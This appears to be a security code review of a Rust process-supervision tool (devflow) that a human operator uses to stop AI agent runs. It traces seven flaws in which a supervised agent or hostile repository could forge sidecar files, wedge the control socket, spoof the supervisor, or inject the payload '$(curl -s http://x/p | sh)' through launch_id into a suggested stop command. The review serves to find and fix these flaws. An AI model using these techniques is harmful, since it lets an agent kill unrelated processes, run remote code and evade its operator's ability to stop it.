I read the real files in the snapshot (not just the diff). Findings below are ordered by severity; each quotes the snapshot.

---

## 1. HIGH — CONFIRMED — the STALE backstop's identity proof is self-referential: a sidecar writer picks the process group `devflow stop` kills

`crates/devflow-core/src/supervisor/backstop.rs:322-341` (`classify`) — the *only* evidence is the sidecar plus `/proc` facts the sidecar author can also read:

```rust
    if let Some(why) = facts
        .state_record
        .as_ref()
        .and_then(|record| first_disagreement(recorded, record))
    ...
    if recorded.boot_id != current_boot {
        return BackstopDecision::PreviousBoot;
    ...
        Some(leader) if leader.start_time != recorded.start_time => {
            BackstopDecision::LeaderRecycled
        }
        Some(leader) if leader.pgrp == pgid => BackstopDecision::LeaderPresentSignal,
```

The cross-check against the state record is skipped whenever the state will not load — `crates/devflow-cli/src/commands.rs:2316-2320` passes `record: None`, and `commands.rs:2246` then calls the backstop with no record at all:

```rust
        [entry] => Ok(Some(LocatedSocket {
            socket: entry.socket_path.clone(),
            record: None,
```

Sweep attribution trusts the same sidecar (`crates/devflow-core/src/supervisor.rs:594-597`):

```rust
    if let Some(sidecar) = &entry.sidecar {
        return sidecar.project_root == project_root && sidecar.phase == phase;
    }
```

**Failure scenario (traced):** the supervised agent runs as the same uid and can write `~/.cache/devflow/sock` (0700 is owner-only, and it *is* the owner). It (a) binds-then-closes `sock/<fnv(root):016x>-<padded phase>-<hex>.sock` so the probe answers `Stale`, (b) writes the sibling `.json` with `agent_pgid` = a live process-group leader it wants dead (e.g. another phase's agent, which is the leader of its own group), `agent_start_time` = that process's `/proc/<pid>/stat` field 22, `boot_id` = `/proc/sys/kernel/random/boot_id`, and (c) truncates `.devflow/state-<NN>.json` so it will not load. The operator's `devflow stop --phase NN` then reaches `kill_group` (`backstop.rs:530-548`) and sends SIGTERM, then SIGKILL, to that group. Every value the guard compares was supplied by the attacker or is world-readable; `leader.pgrp == pgid` and `start_time` match by construction.

Caveat, stated honestly: no privilege boundary is crossed (same uid), so this is a confused-deputy kill driven by repo/agent content, not escalation. But it is exactly the "spoofed sidecar → signals an unrelated group" path the design claims is closed, and the design's threat model ("malicious or confused agent subprocess", "hostile repository") has both ingredients.

---

## 2. HIGH — CONFIRMED — `connect()` has no timeout and the control thread serves one connection at a time: the supervised agent can make the run un-stoppable

`crates/devflow-core/src/supervisor.rs:316` (probe) and `:696` (`request_shutdown`) — blocking connect, no timeout anywhere:

```rust
        let stream = match UnixStream::connect(path) {
```

versus the module's own invariant at `crates/devflow-core/src/supervisor/protocol.rs:5`:

```rust
//! and write on a connection is bounded by [`IO_TIMEOUT`], so an oversized or
//! slow peer cannot wedge either side (T-50-11).
```

`crates/devflow-core/src/supervisor/runtime.rs:701-718` — connections are served inline on the single control thread, each for up to `IO_TIMEOUT` (2 s) in `read_request`, and the client's read times out at the same 2 s (`protocol.rs:27`):

```rust
                Ok((stream, _)) => self.serve_connection(stream, parked),
```
```rust
        if stream.set_nonblocking(false).is_err() || !protocol::peer_is_same_user(&stream) {
```

**Failure scenario (traced):** a child of the supervised agent (same uid; the socket path is listed in its own supervisor's argv and in `~/.cache/devflow/sock`) opens `N` connections to the socket and sends one byte each. Two outcomes, both bad:
- With `N` below the std listener backlog, our `ping` connect succeeds but its reply is queued behind `N × 2 s`, exceeding the client's 2 s read timeout → `ProbeError::NoReply` → `stop` prints "did not answer the shutdown … nothing was signalled or recorded" (`commands.rs:2560-2570`) and returns an error. `devflow stop` can never stop the run, defeating D-04/999.138.
- With the backlog (~128) full, `UnixStream::connect` blocks in the kernel with no timeout, so `devflow stop`, `status` and `doctor` (which probes every socket in the shared `sock/` via `sweep_in`, `supervisor.rs:530`) hang indefinitely.

Secondary: every `shutdown` request that lands in `AgentRunning` is `parked` (`runtime.rs:753-760`) and grows an unbounded `Vec<UnixStream>` before `finish`.

---

## 3. MEDIUM — CONFIRMED — "identity unknown" is stored as a concrete `0`/`""` and then read as a proven value, producing a false "proved gone"

`crates/devflow-core/src/monitor.rs:1542-1543`:

```rust
        agent_start_time: crate::agent::process_start_time(agent_pid).unwrap_or(0),
        boot_id: crate::supervisor::boot_id().unwrap_or_default(),
```

`crates/devflow-core/src/supervisor/backstop.rs:328` and `:335` interpret those sentinels as facts:

```rust
    if recorded.boot_id != current_boot {
        return BackstopDecision::PreviousBoot;
```
```rust
        Some(leader) if leader.start_time != recorded.start_time => {
            BackstopDecision::LeaderRecycled
```

`backstop.rs:496-501` then *acts* by deleting the files:

```rust
        | BackstopDecision::LeaderRecycled => {
            super::remove_launch_files(socket)?;
```

**Failure scenario (traced):** on a host/container where `/proc/sys/kernel/random/boot_id` is unreadable but `/proc/<pid>` is readable (or the one-shot `process_start_time` read fails during spawn), the sidecar and the state record both hold `""`/`0`, so `first_disagreement` still passes. When the supervisor later dies (STALE) with the agent group alive, `classify` returns `PreviousBoot` (empty ≠ current) or `LeaderRecycled` (0 ≠ the live leader's real start time). `settle` deletes the socket and sidecar and `crates/devflow-cli/src/commands.rs:2631` reports success:

```rust
                "stop: {subject}: nothing was running ({why}); removed the stale socket {} and its \
```

The operator is told nothing was running, `stopped` is persisted, and the live agent group is orphaned with its only addressable handle destroyed. Rule 6's safety argument ("the kernel does not reuse a pid while it names a process group") assumes the recorded start time is a real start time; `0` and `""` are not, and `classify` has no branch for them.

---

## 4. MEDIUM — CONFIRMED — attacker-controlled `launch_id` / `cmdline` are pasted verbatim into a copy-pasteable shell command and into the terminal

`crates/devflow-cli/src/commands.rs:2375-2377` (the same string is built by `LiveSocket::repair_line`, `commands.rs:3318-3320`):

```rust
        Some(id) => format!(
            "launch {id} ({liveness}{sidecar_note}): devflow stop --phase {phase} --launch {id}"
        ),
```

`id` is `sidecar.launch_id` — a free-form `String` (`crates/devflow-core/src/supervisor.rs:363`) read from the `.json` beside a socket, and `sweep_entry` never compares it to the socket file stem (it only records `launch_id_in_name` separately, `supervisor.rs:575`).

**Failure scenario (traced):** a sidecar containing `"launch_id": "$(curl -s http://x/p | sh)"` makes `devflow start`'s live-run refusal, `devflow stop`'s several-sockets refusal, and `devflow doctor` print `... run \`devflow stop --phase 50 --launch $(curl -s http://x/p | sh)\` first`. The operator is instructed to run that line; shell substitution executes it. There is no charset validation on any read of `launch_id` (only the *writer* uses `new_launch_id`'s 16 hex digits).

Same class, display only: `crates/devflow-core/src/supervisor/backstop.rs:206-215` prints each member's `cmdline` (a process-controlled string, ANSI escapes included) unescaped into the operator's terminal, so a hostile group member can repaint the stop output.

---

## 5. MEDIUM — CONFIRMED — `__monitor --socket` accepts any path, and the sidecar write clobbers whatever is at `<path>.json`; the state-recorded socket path is never confined to the cache dir

`crates/devflow-cli/src/pipeline_launch.rs:1367-1368` — the only validation is the `sun_path` length:

```rust
    let socket = devflow_core::supervisor::SocketPath::new(invocation.socket.clone())
        .map_err(|err| CliError::Message(format!("monitor socket path refused: {err}")))?;
```

`crates/devflow-core/src/monitor.rs:1311` writes the sidecar *before* publishing, and `crates/devflow-core/src/supervisor.rs:464` renames over the target unconditionally:

```rust
        .and_then(|()| std::fs::rename(&temp, &target));
```

`Supervisor::serve` then returns early on `AlreadyExists` "because its sidecar is not ours to remove" — i.e. it leaves the clobbered sidecar in place for the *real* launch.

**Failure scenario (traced):** any same-uid process runs `devflow __monitor --project … --socket <victim stem>.sock -- a`. `write_sidecar` replaces the victim launch's sidecar (launch id, pgid, start time, boot id) with attacker values; `publish` then fails `AlreadyExists` and the monitor exits, leaving the forged sidecar behind. The victim supervisor is still ALIVE, but when it later goes STALE its teardown reads the forged sidecar, `first_disagreement` fires and the backstop refuses — the victim's agent group becomes un-teardownable through DevFlow.

Same root cause on the read side: `State::supervisor.socket_path` (`crates/devflow-core/src/state.rs:455`) is used as recorded (`commands.rs:2295`, `:3337`) with no requirement that it live under `cache_dir/sock`, and `remove_launch_files` (`supervisor.rs:645-655`) unlinks `<recorded path>` and `<recorded path>.json` wherever they point. The uid/socket-type checks in `own_socket_at` (`supervisor.rs:335-352`) are the only thing bounding that, and they say nothing about location.

---

## 6. MEDIUM — CONFIRMED — uid equality is treated as authentication: a same-uid listener on the recorded path is accepted as the supervisor, and its numbers are echoed as the stop result

`crates/devflow-core/src/supervisor/protocol.rs:275` — the client never checks peer credentials (`peer_is_same_user` exists only server-side, `protocol.rs:190`); `crates/devflow-core/src/supervisor.rs:335-352` checks only the *file*'s owner. `crates/devflow-cli/src/commands.rs:2476-2481` then trusts the reply's numbers:

```rust
                 code {exit_code}, {advance})"
```

**Failure scenario (traced):** a same-uid process unlinks `<stem>.sock` and binds its own listener that answers `{"ok":true,"stopped":true,"exit_code":999999,"advance_suppressed":true}`. `devflow stop --phase N` prints "stopped phase N through its supervisor (agent group ended, exit code 999999 …)", returns `SocketStop::Ended`, and `commands.rs:2022-2023` persists `stopped`, while the real agent group keeps running: the real supervisor was never signalled and the backstop was never reached. `exit_code`/`advance_suppressed` are also unvalidated (`read_shutdown_line`, `supervisor.rs:753`), so arbitrary integers and a false "advance suppressed" are displayed.

---

## 7. LOW — CONFIRMED — environment leakage into the detached supervisor and its agent

`crates/devflow-core/src/git.rs:87-94` scrubs only git-redirecting variables, and both `__monitor` (`monitor.rs:478-500`) and its agent (`monitor.rs:1455-1465`) inherit the rest of the operator's environment. That includes `DEVFLOW_CACHE_DIR` (`crates/devflow-core/src/registry.rs:54`), so a `devflow stop`/`doctor`/`start` the agent runs *itself* sweeps a directory the agent chose (findings 1 and 6 then apply with no write access to the real cache needed), plus every credential the operator's shell exports.

---

## NOT REVIEWED

- `crates/devflow-cli/src/preflight.rs` — grepped for `supervisor|socket|monitor` only; not read. No phase-50 logic found there, but I did not verify its spawn sites against `hermetic_spawn_sites.rs`.
- Large parts of `crates/devflow-core/src/monitor.rs` (~6.3k lines): I read the supervisord/launch/terminate regions (400-600, 1190-1900, 2180-2280) and the `/proc` identity helpers, **not** `drive_stream_io`, the idle-timeout verdict path, `enumerate_phase_commits`, or the appended test modules.
- Large parts of `crates/devflow-cli/src/commands.rs` (~11k lines) and `pipeline_launch.rs` (~9.9k lines): I read the stop/doctor/recover/launch-guard/`publish_record` regions and `run_monitor`, **not** `start`/`resume` bodies, the gate sweep, `reap_strays`, or the appended test modules.
- `crates/devflow-core/src/agent.rs`: read the `ProcStat`/`process_start_time`/`is_same_process` region and grepped the stray-census doc; did **not** review `discover_stray_devflow_processes` / `classify_stray_layer` bodies despite their signal-delivery relevance.
- `crates/devflow-core/src/gates.rs`: reviewed only the +107-line diff (`poll_response_cancellable`), not the whole file.
- `crates/devflow-core/src/state.rs`: reviewed `SupervisorRecord` and the `supervisor` field; not the rest of the 1.6k-line file.
- `crates/devflow-core/src/lock.rs`: reviewed `publish_lock` / `acquire_after_existing` / holders (lines 140-360); not the sweeper or the test module.
- Not opened at all: `pipeline_gate.rs`, `pipeline_outcomes.rs`, `staleness.rs`, `doc_check.rs`, `recover.rs` beyond lines 430-520, `registry.rs` beyond the cache/socket dir helpers, `workflow.rs`, and every test file.
